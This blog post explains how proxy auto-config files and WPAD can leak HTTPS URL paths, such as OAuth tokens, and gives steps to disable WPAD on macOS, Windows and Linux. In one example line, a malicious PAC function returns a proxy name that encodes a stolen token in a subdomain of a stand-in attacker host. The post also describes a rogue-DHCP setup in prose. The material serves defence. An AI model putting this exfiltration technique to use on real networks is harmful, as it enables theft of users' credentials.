---
layout: post
title: "Is HTTPS enough? What you should know about Web-Proxy Auto Discovery (WPAD)"
description: "Web Proxy Auto-Discovery considered harmful"
date: 2016-07-28 12:00
author:
  name: Sebastián Peyrott
  url: https://twitter.com/speyrott?lang=en
  mail: speyrott@auth0.com
  avatar: https://en.gravatar.com/userimage/92476393/001c9ddc5ceb9829b6aaf24f5d28502a.png?size=200
design:
  bg_color: "#305D92"
  image: https://cdn.auth0.com/blog/wpad/logo.png
  image_size: "100%"
  image_bg_color: "#222228"
  blog_series: false
tags:
- https
- security
- proxy
- wpad
- web proxy autodiscovery
- autodiscovery
- proxy config
- proxy configuration
- automatic proxy configuration
related:
- 2016-04-18-progressive-profiling
- 2015-12-29-how-paypal-could-have-avoided-account-hack
- 2016-04-26-using-https
---

[Dan Goodin from ArsTechnica](http://arstechnica.com/security/2016/07/new-attack-that-cripples-https-crypto-works-on-macs-windows-and-linux/) recently brought to light the subject of one of the talks from this year's BlackHat conference: [Crippling HTTPS With Unholy PAC](https://www.blackhat.com/us-16/briefings.html#crippling-https-with-unholy-pac). Although the conference will be carried out in the next few days, the abstract for the talk gives enough information to know what's going on: due to the way proxy automatic configuration (PAC) works, protected information may be leaked to observers, even when HTTPS is used. We'll talk about why you should care and what to do about it.

{% include tweet_quote.html quote_text="Due to the way PAC works, HTTPS protected URLs can be leaked" %}

-----

## Proxies and HTTPS
Proxies are special web servers that act as a middle man between clients and other servers. Proxy servers receive requests from clients and then forward them to their targets. Some proxy servers perform certain manipulations of the data contained in the requests (both the actual request and the server's response). Most of the time, however, these manipulations are little more than allowing, denying or caching the request.

Proxy servers can do much more with unencrypted connections. By acting as a middle-man, on-the-fly modifications to the requests and responses are possible.

HTTPS establishes a limit to what things are possible for men-in-the-middle. By keeping the whole HTTP exchange encrypted, it is not possible for eavesdroppers to read any of the data in the request, not even the headers or the request paths. In other words, even in the presence of proxies, HTTPS communications remain secure. Or is that so?

> HTTPS and TLS rely on a chain of certificates to remain secure. If this chain of certificates is tampered or modified in any way, man-in-the-middle attacks become possible. For instance, it is possible for an organization which controls employee computers to install their own root certificate in the chain of trusted certificates. By doing so, and forcing employees to use their internal proxy, the organization can transparently read and modify all data that goes through their network. This is an effective man-in-the-middle attack giving full access to all HTTPS encrypted data (Gmail, Facebook, Bank, etc.).

### Legitimate uses of proxies
Although it may seem at first proxies can only do bad things, there are legitimate use cases for them. A caching proxy can take a look at identical requests within a timeframe and avoid unnecessary network load. An anonymous proxy can make access to sensitive information possible for people controlled by the government (think totalitarian regimes). Content-filtering proxies may filter data according to an acceptable use policy (in public places, for example). 

## Proxy Auto Configuration (PAC)
Although proxies can be configured manually (on a per-app or system-level basis), a proxy automatic configuration (PAC) file is used many times. The PAC file contains instructions on how the application (usually a browser) must access a specific host. The PAC file is a JavaScript file. This system was designed by Netscape for Netscape Navigator 2.0 (1996) and is still in use today.

A sample PAC file:

```javascript
function FindProxyForURL(url, host) {
 
// If the hostname matches, send direct.
    if (dnsDomainIs(host, "intranet.domain.com") ||
        shExpMatch(host, "(*.abcdomain.com|abcdomain.com)"))
        return "DIRECT";
 
// If the protocol or URL matches, send direct.
    if (url.substring(0, 4)=="ftp:" ||
        shExpMatch(url, "http://abcdomain.com/folder/*"))
        return "DIRECT";
 
// If the requested website is hosted within the internal network, send direct.
    if (isPlainHostName(host) ||
        shExpMatch(host, "*.local") ||
        isInNet(dnsResolve(host), "10.0.0.0", "255.0.0.0") ||
        isInNet(dnsResolve(host), "172.16.0.0",  "255.240.0.0") ||
        isInNet(dnsResolve(host), "192.168.0.0",  "255.255.0.0") ||
        isInNet(dnsResolve(host), "127.0.0.0", "255.255.255.0"))
        return "DIRECT";
 
// If the IP address of the local machine is within a defined
// subnet, send to a specific proxy.
    if (isInNet(myIpAddress(), "10.10.5.0", "255.255.255.0"))
        return "PROXY 1.2.3.4:8080";
 
// DEFAULT RULE: All other traffic, use below proxies, in fail-over order.
    return "PROXY 4.5.6.7:8080; PROXY 7.8.9.10:8080";
}
```

The PAC file contains a single function: `FindProxyForURL`. This function is called by the application whenever a new connection to a host is to be established. The function must return the type of connection (direct or proxied). If the connection is to be proxied, it also returns the details on how to connect to the proxy. 

> `isInNet`, `myIpAddress`, `shExpMatch`, `dnsDomainIs` are all functions defined by the PAC spec and available for PAC files. Here is a list of [all available functions](http://findproxyforurl.com/pac-functions/).

To configure a proxy using this file, one can point a browser to its URI. This file is usually hosted locally or at an accessible location inside the local network. With a PAC file, rather than setting the proxy manually for each (or all hosts), one can rely on its functionality. This simplifies configuration somewhat. Things can be easier, though.

### Web-Proxy Auto Discovery (WPAD)
With PAC files, we have gone from manually setting proxies for hosts to simply pointing a web browser to a file in the internal network. This requires a configuration step, however. We can do better: automatic discovery of the PAC file! This is precisely what the Web-Proxy Auto Discovery (WPAD) protocol does.

With WPAD enabled, a browser will perform special requests against the DHCP and DNS servers set up in the network. These requests attempt to get the PAC file described before.

When WPAD is enabled inside a local network, all clients with WPAD enabled will automagically get the right proxy settings. There is no need to set the URL for the PAC file in each new client. For big organizations this is a win.

Setting up WPAD in DHCP and DNS servers is usually a matter of editing one or two lines in config files.

> To learn how to set up WPAD in your DHCP and DNS servers, head over to [FindProxyForURL.com](http://findproxyforurl.com/deploying-wpad/).

Firefox and Chrome only support WPAD through DNS queries. Internet Explorer supports both DHCP and DNS.

## A Malicious PAC file
Now that we understand proxies, PAC and WPAD, we can take a look at how this actually helps us circumvent HTTPS. The issue lies in an implementation detail regarding the use of the `FindProxyForURL` function.

As explained above, when a browser is about to establish a new connection to a host, it must first call the `FindProxyForURL` function from the PAC file. This function takes two arguments:

```javascript
function FindProxyForURL(url, host) {
    // (...)
}
```

- **url**: the full URL for the request to be performed by the client.
- **host**: only the host part of the URL.

And *this* is precisely where the information leaks happens. **With HTTPS, the actual path of the URL is protected**. Only the host is known to third parties (as it is seen when establishing the TCP connection).

The PAC specification was devised in 1996. HTTPS only saw a major uptake from the year 2000 onwards. Up to then, SSL and TLS were available but not used that much. To be fair, SSL had been available in one way or another since 1995, so the PAC spec should have considered this. Still, in those years people were still trying to come up with a [working SSL protocol](https://en.wikipedia.org/wiki/Transport_Layer_Security#History_and_development). It is fair to say interactions with ad-hoc protocols such as PAC and WPAD was not of much concern.

As HTTPS protects URL paths, many applications rely on this functionality. Take for instance [OAuth2](http://oauth.net/2/): it relies on redirects between the resource owner, the authorization server and the client. These redirects may encode security tokens as part of the URL. The OAuth2 spec even warns about this:

> The redirection endpoint SHOULD require the use of TLS as described in Section 1.6 when the requested response type is "code" or "token", or when the redirection request will result in the transmission of sensitive credentials over an open network. - [**RFC 6749, section 3.1.2.1**](https://tools.ietf.org/html/rfc6749#section-3.1.2.1).

A malicious PAC file would have access to this information. It could then proceed to *leak* this information to an attacker. A simple way to do so would be to encode the information in the subdomain part of the proxy URL. For instance, once the important information is collected, the `FindProxyForURL` function could simply return:

```
"PROXY token.2348ab92ab34cdeaf.malicous-proxy.org:8080"
```

### WPAD Considered Harmful
Although the problem is not directly linked to WPAD, it does compound the problem. An attacker could simply set a rogue (but fast) DHCP server in a shared network, then proceed to hand out malicious DNSs that point to his or her PAC file. All clients with WPAD enabled would silently fall into the trap. And they would do so transparently. As long as the malicious proxy, DNS and DHCP servers are fast enough, users won't notice. Only a security conscious user may for any reason access the proxy settings of his or her computer and then take note a proxy is in use. Still, he would not realize of the malicious behaviour until checking the PAC file or the network requests performed against the proxy.

As another abstract from the upcoming BlackHat conference describes, WPAD attacks, although known for a while, are *still* a source for concern:

> The DNS portion of the experiment revealed more than 38 million requests to the WPAD honeypot domain names from oblivious customers. - [**BADWPAD BlackHat 2016 talk abstract**](https://www.blackhat.com/us-16/briefings.html#badwpad)

### A Sensible Fix
A sensible fix has been implemented by Microsoft. As of Internet Explorer 11 and the Edge browser, the URL argument passed to the `FindProxyForURL` function is truncated to only include the host. There is little reason for a PAC file to require access to the path to compute the right proxy for a host. If there is a legitimate PAC file out there that does this, a better alternative must surely be available.

Other browsers, however, still pass the full URL to the `FindProxyForURL` function. Therefore, the only way to make sure you are not exposed to the attack is to *make sure WPAD is disabled*. If you require a PAC file for setting up the proxy, then manually setting the URL to it is an option. Most systems allow for per-network settings. There is no reason to keep WPAD enabled.

### Making sure WPAD is disabled
#### macOS
1. Go to System Preferences (Apple menu -> System Preferences).
2. Go to Network and pick the currently active connection.
3. Select Advanced, then Proxies.
4. Make sure "Auto Proxy Discovery" is unchecked.

![macOS proxy settings](https://cdn.auth0.com/blog/wpad/macos.png)

This is of particular importance for WiFi networks. Most laptops connect inadvertently to public WiFi access points. If you are using a wired connection, make sure WPAD is disabled for WiFi as well.  

#### Windows
The following steps work for Windows 10:

1. Click the Windows logo on the bottom left corner and select `Settings`.
2. Select `Network & Internet`.
3. Select `Proxy` from the list on the left.
4. Make sure "Automatically Detect Settings" is disabled.

![Windows 10 proxy settings](https://cdn.auth0.com/blog/wpad/win10.png)

The following steps work for Windows 8 and 8.1:

1. Press `Win + C` or move the mouse pointer to the lower left corner of the screen.
2. Select `Change PC Settings`.
3. Select `Network` and then pick `Proxy` from the list on the left.
4. Make sure "Automatically Detect Settings" is disabled. This screen is identical to the one from Windows 10.

The following steps work for Windows XP, Windows Vista and Windows 7:

1. Click `Start` or the Windows logo and then find `Control Panel`.
2. In the control panel select `Internet Options`.
3. Go to the `Connections` tab and select `LAN Settings`.
4. Make sure "Automatically detect settings" is disabled.

![Windows XP/Vista/7 proxy settings](https://cdn.auth0.com/blog/wpad/win7.jpg)

#### Linux
There are many ways to configure networks in Linux systems. The following steps work for Linux systems using [NetworkManager](https://en.wikipedia.org/wiki/NetworkManager) to manage network settings on GNOME 3.20. NetworkManager is the default network manager for Ubuntu, Fedora, RedHat Linux and OpenSUSE. In case you are using netctl, ConnMan or other network manager, check the docs for them.

1. Move the mouse to the top right corner and click on the wired or wireless icon.
2. Select the "wrench and screwdriver" icon.
3. Select `Network`, then pick `Network proxy` from the list on the left.
4. Make sure the `Method` combobox is set to `None` or `Manual`.

![GNOME + NetworkManager proxy settings](https://cdn.auth0.com/blog/wpad/linux.png) 

## Other Possible Attacks
WPAD DNS lookups rely on using a "fake" URL to a potential WPAD file. The DNS server must notice this and then proceed to point the browser to the host address where this file is located. By hijacking these requests, it is possible to point users to malicious PAC files. This attack could conceivably be performed in a WAN, when the right conditions for DNS settings and registered names are met. See the [WPAD Name Collision Vulnerability report TA16-144A from US-CERT](https://www.us-cert.gov/ncas/alerts/TA16-144A).

In other words, WPAD posses a security risk when enabled. Its semantics are not entirely clear, and implementations have been inconsistent across browsers, DNS servers and DHCP servers, opening the possibility for more attacks.

## Conclusion: WPAD considered harmful
Malicious PAC files are a security problem. WPAD makes it possible for malicious PAC files to find their way to their system without users knowing. HTTPS connections provide adecuate protection against man-in-the-middle attacks, but implementation details regarding the use of PAC files make some browsers leak crucial information contained in URLs, information that should be protected by HTTPS. Until browsers correct this, the only sensible solution is to disable WPAD and setup proxies manually.

{% include tweet_quote.html quote_text="The only sensible solution is to disable WPAD and setup proxies manually." %}
